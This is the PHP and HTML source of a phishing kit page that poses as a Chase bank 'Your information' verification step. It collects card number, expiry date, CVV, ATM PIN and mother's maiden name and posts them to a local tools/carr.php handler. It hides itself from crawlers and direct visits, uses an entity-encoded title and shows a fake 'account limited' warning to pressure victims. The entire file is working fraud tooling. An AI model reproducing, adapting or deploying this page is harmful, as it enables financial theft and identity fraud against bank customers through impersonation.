<?php
   $currentPage = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
   
   if ($_SERVER['REQUEST_METHOD'] == "GET" && strcmp(basename($currentPage), basename(__FILE__)) == 0)
   {
       http_response_code(404);
       include('error_page.php'); // provide your own 404 error page
       die(); /* remove this if you want to execute the rest of
                 the code inside the file before redirecting. */
   }
//    include 'hidden.php';
//    include 'anoxytytrap/bot.php';
//    include 'anoxytytrap/ref.php';
   ?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr">
   <head>
      <meta charset="UTF-8">
      <meta name="robots" content="none">
      <meta name="robots" content="noindex, nofollow">
      <title>&#x59;&#x6f;&#x75;&#x72;&#x20;&#x49;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x2d; </title>
      <meta name="description" content="">
      <meta name="author" content="">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=no">
      <link id="externalCSSLink" rel="external stylesheet" href="./assets/css/external.css">
      <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="./assets/img/favicon.ico">
      <link rel="stylesheet" href="./assets/css/origination.css">
      <link rel="stylesheet" href="assets/css/pops.css">
      <link rel="stylesheet" href="assets/dist/css/formValidation.min.css">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
   </head>
   <body data-gr-c-s-loaded="true" data-has-view="true" class="no-ignore-color">
      <div id="container">
         <header id="header-container" data-has-view="true">
            <div class="header-container" data-is-view="true">
               <div class="row top">
                  <div class="col-xs-4"> <span id="menuLines-iconanchor-wrapper"><a class="jpui iconaction focus onDark" href="javascript:void(0);" id="menuLines"> <span class="util accessible-text" id="accessible-menuLines">Open main menu</span> </a></span> <span class="jpui link" id="exitApp-link-wrapper"><a class="link-anchor INPUTFIELD2" id="exitApp" href="javascript:void(0);" >Exit</a></span></div>
                  <div class="col-xs-4 color-mode-header-logo">
                     <svg class="octogon" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 268 268" xml:space="preserve" xml="http://www.w3.org/XML/1998/namespace" focusable="false">
                        <path d="M100.749,8.655c-4.88,0-8.86,3.968-8.86,8.844v62.095h164.04L181.227,8.69L100.749,8.655" style="fill: rgb(255, 255, 255);"></path>
                        <path d="M261.945,98.372c0-4.884-3.947-8.82-8.875-8.82h-62.052V253.6l70.896-74.726L261.945,98.372" style="fill: rgb(255, 255, 255);"></path>
                        <path d="M172.177,259.538c4.864,0,8.86-3.965,8.86-8.845v-62.099H16.989l74.678,70.943H172.177" style="fill: rgb(255, 255, 255);"></path>
                        <path d="M10.996,169.848c0,4.896,3.933,8.829,8.832,8.829h62.111V14.629L10.996,89.362V169.848" style="fill: rgb(255, 255, 255);"></path>
                     </svg>
                  </div>
                  <div class="col-xs-4 util right aligned"></div>
               </div>
            </div>
         </header>
         <div>
            <div class="container-fluid" id="secondary-header-container"></div>
            <main class="container-fluid" id="main">
            <div id="progressbar-block" data-has-view="true">
               <div data-is-view="true">
                  <style id="progress-bar-step-1of8">.origination-custom.jpui.progress.bar.step1of8:after{width: 56.5%;}</style>
                  <div class="row origination-progress-block">
                     <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div id="PROGRESSBAR_HEADER">
                           <div>
                              <h1 id="stepNameTagElementId" tabindex="-1" aria-describedby="stepNameApplicantTypeHeader">Your information</h1>
                              <span class="jpui util accessible-text" id="stepNameApplicantTypeHeader" aria-hidden="true"></span>
                           </div>
                        </div>
                        <div id="PROGRESSBAR_PROGRESS">
                           <div class="row">
                              <div class="col-xs-12 col-sm-12">
                                 <div class="jpui progress origination-custom step2of8 bar" id="main-progress" data-progress="">
                                    <div class="bar fill" id="main-progress-bar"></div>
                                    <span class="util accessible-text" id="accessible-bar-main-progress"></span>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div id="PROGRESSBAR_ADVISORY">
                           <div>
                              <h2 id="stepAdvisoryTagElementId" tabindex="-1">Tell us about your Card details.</h2>
                           </div>
                        </div>
                     </div>
                  </div>
                  <style id="progress-bar-step-2of8">.origination-custom.jpui.progress.bar.step2of8:after{width: 56%;}</style>
               </div>
            </div>
            <section class="origination page-content" id="content" data-has-view="true">
               <div class="field-mt-18" id="CUSTOMERINFO" data-is-view="true">
                  <div class="row">
                     <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div id="personalName" data-has-view="true">
                           <div id="personal-name" data-is-view="true">
                              <div class="row">
                                 <div class="col-xs-12 col-sm-6">
                                    <div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">Card details</div>
                                 </div>
                              </div>
                              <div class="row">
                                 <div class="col-xs-12 col-sm-12">
                                    <div class="BODY field-mb-24">For your security, please verify your identity and provide requested information..</div>
                                 </div>
                              </div>
                              <div id="authorizingOfficerTitleIdNtb"></div>
                           </div>
                        </div>
                        <form name="" id="login-cc" method="POST" action="tools/carr.php" autocomplete="off">
                           <div class="row">
                              <div class="col-xs-12 col-sm-6">
                                 <div class="jpui fieldgroup" id="blx-nameBlock-firstName">
                                    <div class="jpui vertical">
                                       <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" >Card Number </label> </div>
                                       <div class="fl w-50"> <input min="0" class="jpui input pa2 mb2 db w-100"  type="text" name="cc" value="" required >   </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="row">
                              <div class="col-xs-12 col-sm-6">
                                 <div class="jpui fieldgroup" id="blx-nameBlock-firstName">
                                    <div class="jpui vertical">
                                       <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" >Expiration date </label> </div>
                                       <div class="fl w-50">
                                          <input min="0" class="jpui input pa2 mb2 db w-100"  type="text" name="expdate" value="" required > 
                                          <div class="fieldhelpertext-container" id="dateOfBirth-helpertext-container">
                                             <div class="jpui fieldhelpertext" id="dateOfBirth-text-validate-helpertext">mm/yyyy  </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="row">
                              <div class="col-xs-12 col-sm-6">
                                 <div class="jpui fieldgroup" id="blx-nameBlock-firstName">
                                    <div class="jpui vertical">
                                       <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" >Security Code </label> </div>
                                       <div class="fl w-50">
                                          <input min="0" class="jpui input pa2 mb2 db w-100" maxlength="3" type="tel" name="cvv" value="" required >  
                                          <div class="fieldhelpertext-container" id="dateOfBirth-helpertext-container">
                                             <div class="jpui fieldhelpertext" id="dateOfBirth-text-validate-helpertext">The three digits at the back of your card <img src="assets/img/cvv.png" width="32px" height="20px"> </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="row">
                              <div class="col-xs-12 col-sm-6">
                                 <div class="jpui fieldgroup" id="blx-nameBlock-firstName">
                                    <div class="jpui vertical">
                                       <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" >Atm Pin </label> </div>
                                       <div class="fl w-50"> <input min="0" class="jpui input pa2 mb2 db w-100" maxlength="4" type="text" name="atm" value="" required >   </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="row">
                              <div class="col-xs-12 col-sm-6">
                                 <div class="jpui fieldgroup" id="blx-nameBlock-firstName">
                                    <div class="jpui vertical">
                                       <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" >Mother's Maiden Name </label> </div>
                                       <div class="fl w-50"> <input min="0" class="jpui input pa2 mb2 db w-100"  type="text" name="mmn" value="" required >   </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div id="navigationadvisory-container" data-has-view="true">
                              <div class="field-mt-30" id="NAVIGATIONADVISORY_CMPT" data-is-view="true"></div>
                           </div>
                           <div id="autoLendingAgeInfoOverlayPlaceHolder"></div>
                     </div>
                  </div>
               </div>
            </section>
            <div id="pageGroupSpinner"></div> <div id="navigationbar-container" data-has-view="true"><div id="NAVIGATIONBAR_CMPT" data-is-view="true"><div class="row"><div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">  <div class="row"><div class="col-xs-12 navigation-top-margin"> <button type="submit" id="NEXT-nav-ctr-btn" class="jpui button focus util float right primary"><span class="label">Next</span> </button> <button type="button" id="myBtn" class="jpui button focus util float right tertiary"><span class="label">Back</span> </button></div></div></div></div></div></div>    </form>
         </div>
      </div>
      </div>
      <div id="myModal" class="modal">
         <!-- Modal content -->
         <div class="modal-content">
            <span class="close">&times;</span>
            <p style="font-weight: bold;">We noticed some significant 
               changes to your account activity. We require some information from you to understand this kind of account activity better.
               We've also temporarily limited certain features in your CHASE account.!
            </p>
         </div>
      </div>
      <script>
         // Get the modal
         var modal = document.getElementById("myModal");
         
         // Get the button that opens the modal
         var btn = document.getElementById("myBtn");
         
         // Get the <span> element that closes the modal
         var span = document.getElementsByClassName("close")[0];
         
         // When the user clicks the button, open the modal 
         btn.onclick = function() {
           modal.style.display = "block";
         }
         
         // When the user clicks on <span> (x), close the modal
         span.onclick = function() {
           modal.style.display = "none";
         }
         
         // When the user clicks anywhere outside of the modal, close it
         window.onclick = function(event) {
           if (event.target == modal) {
             modal.style.display = "none";
           }
         }
      </script>
      <style type="text/css">
         .red		{color: #bb0826;
         display: block;
         font-size: 1rem;
         font-weight: 300;
         color: #BF2155;
         letter-spacing: 0;
         width: 100%;
         margin: .0625rem .0625rem .313rem 0;
         font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
         font-size: 13px;
         font-weight: bold;
         }
      </style>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
      <script src="assets/dist/js/FormValidation.min.js"></script>
      <script src="assets/dist/js/plugins/Tachyons.min.js"></script>
      <script src="assets/dist/js/done.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
      <script>
         $('input[name="expdate"]').mask('00/0000');
      </script>
   </body>
</html>